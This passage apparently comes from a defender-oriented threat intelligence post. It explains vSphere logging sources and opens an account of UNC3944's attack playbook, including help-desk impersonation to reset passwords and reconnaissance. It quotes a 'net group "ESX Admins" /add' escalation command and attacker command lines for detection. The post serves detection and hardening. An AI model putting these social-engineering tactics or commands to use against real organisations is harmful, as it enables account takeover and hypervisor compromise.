verbose, file-based output of ESXi.</span></p>\n<h3><span style=\"vertical-align: baseline;\">1. vCenter Server (VC Events)</span></h3>\n<p><span style=\"vertical-align: baseline;\">vCenter events operate at the management plane, providing a structured audit trail of administrative actions and automated processes across the entire virtual environment. Each event is a discrete, well-defined object identified by a unique </span><code style=\"vertical-align: baseline;\">eventTypeId</code><span style=\"vertical-align: baseline;\">, such as </span><code style=\"vertical-align: baseline;\">VmPoweredOnEvent</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">UserLoginSessionEvent</code><span style=\"vertical-align: baseline;\">. This programmatic identification makes them ideal for ingestion into Security Information and Event Management (SIEM) platforms like Splunk or Google Chronicle for automated parsing, alerting, and security analysis.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--medium\n      \n      \n        h-c-grid__col\n        \n        h-c-grid__col--4 h-c-grid__col--offset-4\n        \n      \">\n\n      \n      \n        \n        <img alt=\"VC Event log structure\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/vsphere-3944-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: VC Event log structure</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li><strong style=\"vertical-align: baseline;\">Native storage &amp; syslog forwarding:</strong><span style=\"vertical-align: baseline;\"> These events are generated by vCenter Server and stored within its internal VCSA database (PostgreSQL). When forwarded, vCenter streams a real-time copy of these structured events to the syslog server. The resulting log message typically contains the formal </span><code style=\"vertical-align: baseline;\">eventTypeId</code><span style=\"vertical-align: baseline;\"> along with its human-readable description, allowing for precise analysis.</span></li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Primary use cases:</strong></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Security auditing &amp; forensics:</strong><span style=\"vertical-align: baseline;\"> Tracking user actions, permission changes, and authentication</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Change management:</strong><span style=\"vertical-align: baseline;\"> Providing a definitive record of all configuration changes to clusters, hosts, and virtual machines (VMs)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Automated alerting:</strong><span style=\"vertical-align: baseline;\"> Triggering alerts in a SIEM or monitoring tool based on specific </span><code style=\"vertical-align: baseline;\">eventTypeId</code><span style=\"vertical-align: baseline;\">s (e.g., </span><code style=\"vertical-align: baseline;\">HostCnxFailedEvent</code><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Examples of vCenter Events:</strong><span style=\"vertical-align: baseline;\"> As documented in resources like the</span><a href=\"https://github.com/lamw/vcenter-event-mapping/blob/master/vsphere-7.0u3.md\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">vCenter Event Mapping repository</span></a><span style=\"vertical-align: baseline;\">, each event has a specific programmatic identifier.</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">UserLoginSessionEvent</strong></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Description:</strong><span style=\"vertical-align: baseline;\"> \"User {userName}@{ipAddress} logged in as {locale}\"</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Significance:</strong><span style=\"vertical-align: baseline;\"> A critical security event for tracking all user access to the vCenter management plane</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">VmCreatedEvent</strong></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Description:</strong><span style=\"vertical-align: baseline;\"> \"Created virtual machine {vm.name} on {host.name} in {datacenter.name}\"</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Significance:</strong><span style=\"vertical-align: baseline;\"> Logs the creation of new inventory objects, essential for asset management and change control</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">VmPoweredOffEvent</strong></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Description:</strong><span style=\"vertical-align: baseline;\"> \"Virtual machine {vm.name} on {host.name} in {datacenter.name} is powered off\"</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Significance:</strong><span style=\"vertical-align: baseline;\"> Tracks the operational state and availability of workloads. An unexpected power-off event is a key indicator for troubleshooting.</span></p>\n</li>\n</ul>\n</ul>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Note on VCSA Logging Limitations: </strong><span style=\"vertical-align: baseline;\">The VCSA does not, out-of-the-box, support forwarding critical security logs for denied network connections or shell command activity. To enable this non-default capability, a custom configuration at the native Photon OS level is required. This is an agentless approach that leverages only built-in Linux tools (like iptables and logger) and does not install any third-party software. This configuration pipes firewall and shell events into the VCSA's standard rsyslog service, allowing the built-in remote logging mechanism to forward them to a central SIEM.</span></p>\n<h3><span style=\"vertical-align: baseline;\">2. ESXi Host Logs</span><strong style=\"vertical-align: baseline;\"> </strong></h3>\n<p><span style=\"vertical-align: baseline;\">ESXi logs operate at the hypervisor level, providing granular, host-specific operational data. They contain detailed diagnostic information about the kernel, hardware, storage, networking, and services running directly on the ESXi host.</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Native storage: </strong><span style=\"vertical-align: baseline;\">These logs are enabled by default and stored as a collection of plain text files on the ESXi host itself, primarily within the </span><code style=\"vertical-align: baseline;\">/var/log/</code><span style=\"vertical-align: baseline;\"> directory. This storage is often a local disk or a persistent scratch partition. If a persistent location is not configured, these logs are ephemeral and will be lost upon reboot, making syslog forwarding essential for forensics.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"ESXi standard log structure\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/vsphere-3944-fig2.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: ESXi standard log structure</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li><strong style=\"vertical-align: baseline;\">Primary use cases:</strong>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Deep-dive troubleshooting of performance issues</span></li>\n<li><span style=\"vertical-align: baseline;\">Diagnosing hardware failures or driver issues</span></li>\n<li><span style=\"vertical-align: baseline;\">Analyzing storage and network connectivity problems</span></li>\n</ul>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Examples of ESXi log entries sent to syslog:</strong>\n<ul>\n<li><span style=\"vertical-align: baseline;\">(from </span><code style=\"vertical-align: baseline;\">vmkernel.log</code><span style=\"vertical-align: baseline;\">): </span><span style=\"vertical-align: baseline;\">Detailed logs about storage device latency</span></li>\n<li><span style=\"vertical-align: baseline;\">(from </span><code style=\"vertical-align: baseline;\">hostd.log</code><span style=\"vertical-align: baseline;\">)</span><span style=\"vertical-align: baseline;\">: Logs from the host agent, including API calls, VM state changes initiated on the host, and host service activity</span></li>\n<li><span style=\"vertical-align: baseline;\">(from</span><strong style=\"vertical-align: baseline;\"> </strong><code style=\"vertical-align: baseline;\">auth.log</code><span style=\"vertical-align: baseline;\">)</span><span style=\"vertical-align: baseline;\">: Records of successful or failed login attempts directly to the host via SSH or the DCUI</span></li>\n</ul>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">3. ESXi Host Audit Logs</span></h3>\n<p><span style=\"vertical-align: baseline;\">ESXi audit records provide a high-fidelity, security-focused log of actions performed directly on an ESXi host. The following analysis of the provided example demonstrates why this log source is forensically superior to standard logs for security investigations</span><strong style=\"vertical-align: baseline;\">. </strong><span style=\"vertical-align: baseline;\">These logs are not enabled by default.</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Native storage &amp; persistence: </strong><span style=\"vertical-align: baseline;\">These records are written to </span><code style=\"vertical-align: baseline;\">audit.*.log</code><span style=\"vertical-align: baseline;\"> on the host's local filesystem, governed by the </span><code style=\"vertical-align: baseline;\">Syslog.global.auditRecord.storageEnable = TRUE</code><span style=\"vertical-align: baseline;\"> parameter. Persistent storage configuration is critical to ensure this audit trail survives a reboot.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"ESXi audit log structure\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/vsphere-3944-fig3a.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: ESXi audit log structure</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Forensic analysis: standard vs. audit log:</strong><span style=\"vertical-align: baseline;\"> In the provided scenario, a threat actor logs into an ESXi host, attempts to run malware, and disables the </span><code style=\"vertical-align: baseline;\">execInstalledOnly</code><span style=\"vertical-align: baseline;\"> security setting. Here is how each log type captures this event:</span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Standard syslog</strong><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">shell.log</code><strong style=\"vertical-align: baseline;\"> analysis:</strong><span style=\"vertical-align: baseline;\"> The standard log provides a simple, chronological history of commands typed into the shell.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"ESXi standard log output\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/vsphere-3944-fig4a.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: ESXi standard log output</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Limitations:</strong>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">No login context</strong><span style=\"vertical-align: baseline;\">: It does not show the threat actors source IP address or that the initial SSH login was successful.</span></li>\n<li><strong style=\"vertical-align: baseline;\">No outcome</strong><span style=\"vertical-align: baseline;\">: It shows the command </span><code style=\"vertical-align: baseline;\">./malware</code><span style=\"vertical-align: baseline;\"> was typed but provides no information on whether it succeeded or failed.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Incomplete narrative</strong><span style=\"vertical-align: baseline;\">: It is merely a command history, lacking the essential context needed for a full security investigation</span><strong style=\"vertical-align: baseline;\">.</strong></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong style=\"vertical-align: baseline;\">ESXi audit log analysis: </strong><span style=\"vertical-align: baseline;\">The ESXi audit log provides a rich, structured, and verifiable record of the entire session, from connection to termination, including the outcome of each command.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"ESXi audit log output\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/vsphere-3944-fig5a.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 5: ESXi audit log output</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Successful login</strong><span style=\"vertical-align: baseline;\">: It explicitly records the successful authentication, including the source IP.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Failed malware execution</strong><span style=\"vertical-align: baseline;\">: This is the most critical distinction. The audit log shows that the malware execution failed with an exit status of 126.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Successful security disablement</strong><span style=\"vertical-align: baseline;\">: It then confirms that the command to disable a key security feature was successful.</span></li>\n</ul>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This side-by-side comparison proves that while standard ESXi logs show a threat actor's </span><span style=\"font-style: italic; vertical-align: baseline;\">intent</span><span style=\"vertical-align: baseline;\">, the ESXi audit log reveals the actual </span><span style=\"font-style: italic; vertical-align: baseline;\">outcome</span><span style=\"vertical-align: baseline;\">, providing actionable intelligence and a definitive forensic trail. A comprehensive logging strategy for a vSphere environment requires the collection and analysis of three distinct yet complementary data sources. When forwarded to a central syslog server, vCenter Server events, ESXi host audit records, and standard ESXi operational logs provide a multilayered view of the environment's security, administrative changes, and operational health.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Characteristic</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">vCenter Server Events</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">ESXi Audit Logs</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">ESXi Standard Logs</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Scope</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Virtual Center, ESXI</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ESXi</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ESXi</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Enabled by Default</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Yes</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">No</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Yes</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Format</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Structured Objects (eventTypeId)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Verbose, Structured Audit Entries</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Unstructured/Semi-structured Text</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Type</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Administrative, Management, Audit</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Security Audit, Kernel-level Actions</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Management, System-Level State</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Primary Storage</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">VCSA Internal Database</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Local Filesystem (audit.log)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Local Filesystem (/var/log/)</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Primary Use Case</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Central Auditing, Full Cluster Management, Forensics </span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Direct Host Forensics, Compliance</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Deep Troubleshooting, Diagnostics</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 1: Comparison of ESXi Logs and vCenter Events</span></p>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Anatomy of an Attack: The Playbook</span></h2>\n<p><span style=\"vertical-align: baseline;\">UNC3944’s attack unfolds across five distinct phases, moving methodically from a low-level foothold to complete hypervisor control.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Typical UNC3944 attack chain\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/ransomware-attack-chain.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 6: Typical UNC3944 attack chain</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Phase 1: </span><span style=\"vertical-align: baseline;\">Initial Compromise, Recon, and Escalation</span></h3>\n<p><span style=\"vertical-align: baseline;\">This initial phase hinges on exploiting the human element.</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">The tactic:</strong><span style=\"vertical-align: baseline;\"> The threat actor initiates contact by calling the IT help desk, impersonating a regular employee. Using readily available personal information from previous data breaches and employing persuasive or intimidating social engineering techniques, they build rapport and convince an agent to reset the employee's Active Directory password. Once they have this initial foothold, they begin a two-pronged internal reconnaissance mission:</span>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Path A (information stores):</strong><span style=\"vertical-align: baseline;\"> They use their new access to scan internal SharePoint sites, network drives, and wikis. They hunt for IT documentation, support guides, org charts, and project plans that reveal high-value targets. This includes not only the names of individual Domain or vSphere administrators, but also the discovery of powerful, clearly named Active Directory security groups like \"vSphere Admins\" or \"ESX Admins\" that grant administrative rights over the virtual environment.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Path B (secrets stores):</strong><span style=\"vertical-align: baseline;\"> Simultaneously, they scan for access to password managers like HashiCorp Vault or other Privileged Access Management (PAM) solutions. If they find one with weak access controls, they will attempt to enumerate it for credentials.</span></li>\n</ul>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Armed with the name of a specific, high-value administrator, they make additional calls to the help desk. This time, they impersonate the privileged user and request a password reset, allowing them to seize control of a privileged account.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Why it's effective:</strong><span style=\"vertical-align: baseline;\"> This two-step process bypasses the need for technical hacking like Kerberoasting for the initial escalation. The core vulnerability is a help desk process that lacks robust, non-transferable identity verification for password resets. The threat actor is more confident and informed on the second call, making their impersonation much more likely to succeed.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Key detection signals:</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">[LOGS] Monitor for command-line and process execution:</strong><span style=\"vertical-align: baseline;\"> Implement robust command-line logging (e.g., via Audit Process Creation, Sysmon Event ID 1 or EDR). Create alerts for suspicious remote process execution, such as </span><code style=\"vertical-align: baseline;\">wsmprovhost.exe</code><span style=\"vertical-align: baseline;\"> (WinRM) launching native tools like </span><code style=\"vertical-align: baseline;\">net.exe</code><span style=\"vertical-align: baseline;\"> to query or modify sensitive groups (e.g., </span><code style=\"vertical-align: baseline;\">net group \"ESX Admins\" /add</code><span style=\"vertical-align: baseline;\">).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">[LOGS] Monitor for group membership changes:</strong><span style=\"vertical-align: baseline;\"> Create high-priority alerts for </span><code style=\"vertical-align: baseline;\">AD Event ID 4728</code><span style=\"vertical-align: baseline;\"> (A member was added to a security-enabled global group) or </span><code style=\"vertical-align: baseline;\">4732</code><span style=\"vertical-align: baseline;\"> (local group) for any changes to groups named \"vSphere Admins,\" \"ESX Admins,\" or similar.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">[LOGS] Correlate AD password resets with help desk activity:</strong><span style=\"vertical-align: baseline;\"> Correlate </span><code style=\"vertical-align: baseline;\">AD Event ID 4724</code><span style=\"vertical-align: baseline;\"> (Password Reset) and the subsequent addition of a new multi-factor authentication (MFA) device with help desk ticket logs and call records.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">[BEHAVIOR] Alert on anomalous file access:</strong><span style=\"vertical-align: baseline;\"> Alert on a single user accessing an unusually high volume of disparate files or SharePoint sites, which is a strong indicator of the reconnaissance seen during UNC3944 activity.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">[CRITICAL BEHAVIOR] Monitor Tier 0 account activity:</strong><span style=\"vertical-align: baseline;\"> Any password reset on a Tier 0 account (Domain Admin, Enterprise Admin, vSphere) must be treated as a critical incident until proven otherwise.</span></p>\n</li>\n</ul>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Critical hardening and mitigation:</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">[CRITICAL] Prohibit phone-based resets for privileged accounts:</strong><span style=\"vertical-align: baseline;\"> For all Tier 0 accounts, enforce a strict \"no password resets over the phone\" policy. These actions must require an in-person, multipart, or high-assurance identity verification process.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Protect and monitor privileged AD groups:</strong><span style=\"vertical-align: baseline;\"> Treat these groups as Tier 0 assets: tightly control who can modify their membership and implement the high-fidelity alerting for any membership change (</span><code style=\"vertical-align: baseline;\">AD Event ID 4728</code><span style=\"vertical-align: baseline;\">/</span><code style=\"vertical-align: baseline;\">4732</code><span style=\"vertical-align: baseline;\">). This is critical as threat actors will use native tools like </span><code style=\"vertical-align: baseline;\">net.exe</code><span style=\"vertical-align: baseline;\">, often via remote protocols like WinRM, to perform this manipulation. Avoid using obvious, non-obfuscated names like \"vSphere Admins\" for security groups that grant high-level privileges</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Harden information stores:</strong><span style=\"vertical-align: baseline;\"> Implement data loss prevention (DLP) and data classification to identify and lock down sensitive IT documentation that could reveal high-value targets. Treat secrets vaults as Tier 0 assets with strict, least-privilege access policies.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Restrict or monitor remote management tools:</strong><span style=\"vertical-align: baseline;\"> Limit the use of remote management protocols like WinRM and vSphere management APIs to authorized administrative subnets and dedicated PAWs. Log all remote commands for review and anomaly detection.</span></p>\n</li>\n</ul>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Table 2 displays threat actors actions in support of Active Directory escalation along with process and command-line data that an organization may use to detect this activity.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Process Name</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Command Line</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Tactic</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Threat Actor's Goal</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">explorer.EXE</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">\"C:\\Program Files...\\WORDPAD.EXE\" \"\\10.100.20.55\\c$\\Users\\j.doe...\\ACME Power Division\\Documents\\Procedure for Deploying ESXi...docx\"</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Reconnaissance</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Threat actor, using a compromised user account, opens IT procedure documents to understand the vSphere environment and 